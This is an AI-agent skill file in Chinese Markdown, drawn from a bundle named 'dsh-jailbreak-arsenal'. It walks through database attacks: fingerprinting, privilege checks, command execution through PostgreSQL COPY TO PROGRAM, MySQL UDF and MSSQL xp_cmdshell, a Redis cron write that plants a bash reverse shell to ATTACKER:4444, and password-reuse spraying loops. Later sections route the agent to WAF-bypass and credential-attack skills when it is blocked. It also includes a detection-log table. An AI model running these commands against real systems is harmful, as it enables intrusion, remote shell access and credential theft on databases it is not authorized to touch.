---
name: database-security
description: Use for authorized database security assessment covering PostgreSQL/MySQL/MSSQL/Mongo/Redis exposure, authz, UDF/command paths, and misconfiguration review.
whenToUse: Use for authorized database security assessment covering PostgreSQL/MySQL/MSSQL/Mongo/Redi
source: dsh-jailbreak-arsenal@1.7.0 bundled_skills（已按本仓格式改写，非照抄）
---

# Database Security Assessment

## 适用场景

- 数据库未授权/弱口令/错误绑定 0.0.0.0
- 权限过大、危险功能（xp_cmdshell、COPY PROGRAM、UDF）
- 横向：从应用账号到 DBA
- NoSQL 注入与 Redis 写文件等（授权环境）

## 工作流

### 1. 先判库型再选拳（打错方言等于空打）

端口与指纹是第一条线索，但**不要只信端口**：MySQL 常被改到 33060、PG 改到 6543、MSSQL 走 1433/TCP 但也可能是动态端口。

```bash
# 双探：端口 + 协议问候（比只看 banner 准）
nmap -sV -p 3306,5432,1433,27017,6379,9042,1521,5900 --script=banner <TARGET>
# 应用侧拿 DSN/配置：源码里 grep 连接串最快
rg -nE "(mysql|postgres|mongodb|redis|mssql)://[^\"'\\s]+" -g '!node_modules' .
```

判型表（决定后面打哪一招）：

| 库 | 未授权默认特征 | 命令执行路径 | 读文件路径 |
| --- | --- | --- | --- |
| MySQL / MariaDB | `root@%` 空口令 | `INTO OUTFILE` 写 UDF/插件 | `LOAD_FILE()` （需 `FILE` 权限） |
| PostgreSQL | `trust` 认证 | `COPY ... FROM PROGRAM`（需超级用户） | `pg_read_file()` / `COPY FROM '/path'` |
| MSSQL | `sa` 弱口令 | `xp_cmdshell`（需开启）/ `OLE Automation` | `OPENROWSET(BULK)` |
| MongoDB | 无认证 27017 | 无原生 RCE，走 JS 引擎或应用层 | `$where` 侧信道 |
| Redis | 无密码 6379 | 主从复制加载模块 / `MODULE LOAD` | `CONFIG SET dir` + `dbfilename` 写文件 |
| Oracle | `scott/tiger` 默认 | `DBMS_SCHEDULER` / Java 存储过程 | `UTL_FILE` |

### 2. 枚举"我到底是谁、能干什么"（比枚举表重要）

拿到连接后**第一件事不是列表**，是确认权限边界。很多"数据库漏洞"其实是权限给大了，不是库本身破了。

```sql
-- MySQL / MariaDB
SELECT user(), current_user(), version();
SHOW GRANTS FOR CURRENT_USER();
SELECT * FROM information_schema.user_privileges WHERE grantee LIKE '%root%';
SHOW VARIABLES LIKE 'secure_file_priv';   -- 空=可写任意路径，NULL=禁止
SHOW VARIABLES LIKE 'local_infile';

-- PostgreSQL
SELECT current_user, session_user, version();
SELECT rolname, rolsuper, rolcreaterole, rolcreatedb FROM pg_roles WHERE rolcanlogin;
SHOW data_directory;
SELECT * FROM pg_settings WHERE name IN ('archive_command','log_directory');

-- MSSQL
SELECT SYSTEM_USER, USER_NAME(), IS_SRVROLEMEMBER('sysadmin');
SELECT name, is_disabled FROM sys.server_principals WHERE type IN ('S','U');
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell';   -- run_value=1 才意味着能直接打
```

**判断口径**：`IS_SRVROLEMEMBER('sysadmin')=1` 或 MySQL `SUPER`/`FILE` 同时在手 → 可直接走命令执行；只有普通账号 → 先做**权限提升与横向**（找应用侧提权点、找同口令的 DBA 账号），不要硬打 UDF。

### 3. 命令执行（三条真实路径，逐条验证）

```bash
# PostgreSQL：COPY FROM PROGRAM（9.3+，需超级用户）
psql "postgresql://u:p@TARGET:5432/db" -c "COPY (SELECT '') TO PROGRAM 'id > /tmp/p; cat /tmp/p';"

# MySQL：UDF 提权（需 FILE + 插件目录可写）
# 先确认 plugin_dir
mysql -h TARGET -u root -e "SHOW VARIABLES LIKE 'plugin_dir';"
# 上传对应版本的 lib_mysqludf_sys.so 后：
mysql -h TARGET -u root -e "CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.so'; SELECT sys_eval('id');"

# MSSQL：xp_cmdshell（需 sysadmin）
impacket-mssqlclient sa:'PASS'@TARGET -windows-auth -command "EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami';"
```

**逐条验伤信号**（没看到这些就是没打进去）：

- PG：`COPY 1` 且能读到 `/tmp/p` 内容
- MySQL：`SELECT sys_eval('id')` 返回 `uid=...`；报 `Can't open shared library` = 目录不可写或架构不匹配（换 `plugin_dir` 或换 x86_64 版本）
- MSSQL：`xp_cmdshell` 返回结果集；报 `access denied` = 不是 sysadmin，回去做提权

### 4. Redis 未授权（最常见的边界突破入口）

```bash
redis-cli -h TARGET -p 6379 ping                 # PONG = 未授权
redis-cli -h TARGET -p 6379 config get dir       # 找可写目录
redis-cli -h TARGET -p 6379 config set dir /var/spool/cron
redis-cli -h TARGET -p 6379 config set dbfilename root
redis-cli -h TARGET -p 6379 set x "\n\n* * * * * bash -i >& /dev/tcp/ATTACKER/4444 0>&1\n\n"
redis-cli -h TARGET -p 6379 save
```

先确认三件事再写：`config get dir` 可写、`dbfilename` 可改、目标有 cron/authorized_keys/webshell 目录之一。**写完必须 `save`**，否则只在内存里。

### 5. 横向：从应用账号到 DBA

应用账号通常权限受限但**能看到大量业务数据**，而真正的提权点常在应用代码里：

- 源码里的连接串 → 找**更高权限的账号**（迁移脚本、定时任务、备份脚本最爱写死 `root`）
- 同口令复用 → 用应用账号口令试 `root`/`postgres`/`sa`
- 配置文件权限 → `find / -name "*.cnf" -o -name "database.yml" -o -name ".pgpass" 2>/dev/null`

```bash
# 拿到一个库的账号后，批量试同口令（授权范围内）
for u in root postgres sa admin; do
  mysql -h TARGET -u $u -p"$PASS" -e "SELECT 1" 2>/dev/null && echo "命中 $u"
done
```

### 6. 不写不删的取证优先（避免把证据打没）

先导证据再动数据。**任何 `DROP`/`DELETE`/`UPDATE` 都是不可逆**，除非用户明确要求验证破坏性影响：

```bash
# 只读导出结构与账号，用于报告复现
mysqldump -h TARGET -u u -p --no-data --all-databases > schema.sql
pg_dump -h TARGET -U u -s -f schema.sql db
```

## 检测视角（防守方在哪个日志看到你）

| 手法 | 日志位置 | 信号 |
| --- | --- | --- |
| 弱口令爆破 | MySQL `error.log` / PG `postgresql-*.log` | `Access denied for user` 高频、同 IP 多账号 |
| xp_cmdshell | MSSQL `ERRORLOG` + Windows 安全日志 4688 | 进程父级为 `sqlservr.exe`，子进程是 `cmd.exe`/`whoami` |
| COPY PROGRAM | PG `log_statement=all` | `COPY ... TO PROGRAM` 语句原文 |
| Redis 写 cron | 目标 `/var/log/cron`、`syslog` | cron 文件被修改 + `redis-server` 进程写非数据文件 |
| UDF 加载 | MySQL `general_log` | `CREATE FUNCTION ... SONAME` |

**被拦后的三步定位**：① 先看是不是认证失败（不是拦，是口令错）；② 看 `secure_file_priv`/`xp_cmdshell` 这类开关状态（是配置挡的，不是防守设备）；③ 最后才怀疑数据库审计插件/WAF。

## 工具链

| 工具 | 用途 |
|------|------|
| 官方 CLI（mysql/psql/sqlcmd/redis-cli） | 连接与枚举（**首选，最不容易被拦**） |
| sqlmap | 注入验证（`--batch --risk=1 --level=2` 起步，避免高 level 打挂库） |
| nuclei | 已知暴露模板（`-t network/` 里的 redis/mongo 未授权） |
| impacket-mssqlclient | MSSQL 交互 + xp_cmdshell |

## 参考

- `references/db-misconfig-checklist.md`
- `../pentest-tools/` `../cloud-k8s/`

## 路由上下文

**上游**: MASTER R35  
**下游**: 获 OS 命令 → attack-chain；云托管 → cloud-k8s

## 任务完成自检

- [ ] 是否避免未授权写删？
- [ ] 是否区分配置问题与可利用链？
- [ ] Checklist？

## 本机工具实况（导入时快照；当前真值用 `npm run toolkit:check` 或 `node scripts/sync-tool-status.mjs` 复核——表会过期，命令不会）

| 工具 | 状态 |
| --- | --- |
| `sqlmap` | ❌ 未装（用前先装，或改用等价工具） |



<!-- runnability:start scripts/inject-runnability.mjs 生成，勿手改 -->

## 本机可执行性（自动探测；命令是按 Linux/Kali 写的，照抄会撞空）

本技能命令用到的工具里，本机（PATH 与 toolkit 双探）没有：`sqlmap`、`impacket`
- `sqlmap`：`python -m pip install sqlmap`（本机有 python）
- `impacket`：本机无、也无已验证替代——先确认它是否必要，必要时找官方 Windows 构建

runnability:end -->

<!-- second-shot:start scripts/inject-second-shot.mjs 生成，勿手改 -->

## 第二发（主力打不出去时，按这个顺序换）

1. **同类替代**（链路里的互补技能，手法最接近）：`api-security`、`code-audit`、`email-security`、`llm-security`

2. **前提没满足就先回去**：`api-security` —— 上一环没做实，本环再试也是空打

3. **无回显 / 被拦**：先用 `oob-verification` 确认是不是真没打进去（没回显 ≠ 没命中）；确认被 WAF 拦就转 `waf-bypass`

**纪律**：同一手法不许连打三次（第一次是验证、第二次换参数、第三次必须换手法）；换完还不动，就**如实回报**试过哪几条、各自现象是什么——这是下一次改打的依据，不是失败。

second-shot:end -->

<!-- skill-link-graph:build-skill-graph.mjs 生成，勿手改 -->

## 链路位置（本技能不是孤岛：上游先做、下游交给谁、结果落哪个库）

- **阶段**：3 漏洞发现｜**角色**：`vuln-scan`
- **上游**（先做完这些再进来）：`api-security`
- **下游**（产出交给谁）：`credential-attack`
- **互补**（同类场景一起用）：`api-security`、`code-audit`、`email-security`、`llm-security`
- **落库**（做完必须记进演练台，没落库的发现等于没发生）：`vuln` —— 用对应的 `redteam_*` 工具写入，带上原始请求/证据
- **收口必做**（打完不算完，要能证明）：命中判定走 `verification-discipline`（误报排除 + 修复五档判定）；打完之后要**补丁后复测**（补丁/修复后再打一遍，确认真的关掉了，而不是换个入口还能打）也走它；说清对手能不能发现走 `detection-pairing`（检测规则 + 响度）；战果归到哪个战术走 `attack-traceability`（ATT&CK 映射）。**出交付物用 `redteam_report`**（kind=score 出计分战报、kind=targets 出靶标清单），整条链路串起来看用 `redteam_attack_chain` / `redteam_attack_path` —— 这两个只在 `redteam-setup` 的工具表里登记过，做具体攻击时不会想到去翻，所以在这里点名

- **配套工具**（做完这步要落库/查询时用，别只记在上下文里）：`redteam_vuln_query`（按 severity/status/cve/cidr 组合筛，别在长列表里翻）

<!-- /skill-link-graph -->

## ATT&CK 映射

> 本技能会执行的手法对应 MITRE ATT&CK v20.1 下列技术（编号来自 `lib/redteam/attack-map.js`，唯一来源）。

| 战术 | 编号 | 技术 |
| --- | --- | --- |
| 初始访问 | T1190 | 利用面向公众的应用 |
| 凭据访问 | T1003 | 操作系统凭据转储 |

落到事实库时，把这几个编号写进 `attack_step` 的标题或 `detail`：报告与检测配对要靠它们对齐；
**没写编号的动作在「按 ATT&CK 复核」时等于不存在**（防守方按技术编号查日志，查不到就是漏）。
